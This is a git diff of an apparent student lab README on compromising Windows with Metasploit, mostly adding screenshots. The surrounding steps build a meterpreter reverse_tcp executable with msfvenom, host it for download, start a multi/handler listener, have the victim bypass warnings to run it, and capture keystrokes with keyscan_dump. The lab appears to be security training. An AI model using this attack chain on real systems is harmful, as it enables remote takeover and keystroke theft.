@@ -3,8 +3,6 @@ Compromising windows using Metasploit
 # Metasploit
 Compromising windows using Metasploit
 
-### Developed By
-
 # AIM:
 
 To Compromise windows using Metasploit .
@@ -62,6 +60,7 @@ msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
 Find the attackers ip address using ifconfig
 
 ### Output:
+<img width="739" height="339" alt="image" src="https://github.com/user-attachments/assets/43969d2f-3c89-4abd-ad62-0ae261ea3fd0" />
 
 
 
@@ -69,6 +68,7 @@ Create a malicious executable file fun.exe using msenom command ``` msfvenom -p 
 
 ### Output:
 
+<img width="736" height="302" alt="image" src="https://github.com/user-attachments/assets/2ecaa8b1-51a6-4c8d-bac1-b43fbfa77708" />
 
 
 copy the fun.exe into the apache ```/var/www/html ```folder
@@ -89,6 +89,7 @@ Type help or a question mark "?" to see the list of all available commands you c
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
+<img width="677" height="465" alt="image" src="https://github.com/user-attachments/assets/94807d07-ec99-4930-bb49-4e812610b9ec" />
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
@@ -97,6 +98,8 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
+
+<img width="919" height="413" alt="image" src="https://github.com/user-attachments/assets/475d4a64-2d91-4197-9f8f-d3e377b0d607" />
 
 
 
@@ -112,6 +115,7 @@ The target is now owned. Following are meterpreter commands for key capturing in
 
 
 keyscan_dump Shows the keystrokes captured so far
+<img width="751" height="369" alt="image" src="https://github.com/user-attachments/assets/30e5e213-d710-4e8a-a7e5-3a7cadb9e306" />
 
 
 
